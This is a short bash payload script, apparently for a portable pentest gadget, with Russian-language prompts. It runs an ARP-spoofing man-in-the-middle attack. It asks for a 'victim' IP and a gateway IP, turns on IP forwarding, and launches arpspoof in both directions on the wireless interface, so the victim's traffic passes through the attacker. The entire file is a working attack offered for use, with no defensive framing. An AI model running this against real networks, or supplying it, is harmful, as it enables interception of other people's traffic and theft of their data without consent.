#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Title: ARP Spoof Manual
# Description: Простая атака Man-in-the-Middle

PROMPT "ARP SPOOFING\n\nВведите IP жертвы"

VICTIM=$(TEXT_PICKER "IP жертвы:" "192.168.1.100")

PROMPT "Введите IP шлюза (обычно .1)"

GATEWAY=$(TEXT_PICKER "IP шлюза:" "192.168.1.1")

PROMPT "Запускаем ARP Spoof\nЖертва: $VICTIM\nШлюз: $GATEWAY\n\nНажми OK"

# Включаем IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Запускаем ARP spoof
arpspoof -i wlan0 -t $VICTIM $GATEWAY &
arpspoof -i wlan0 -t $GATEWAY $VICTIM &

PROMPT "ARP Spoof запущен!\n\nДля остановки — перезагрузи пейджер.\n\nНажми OK чтобы выйти."
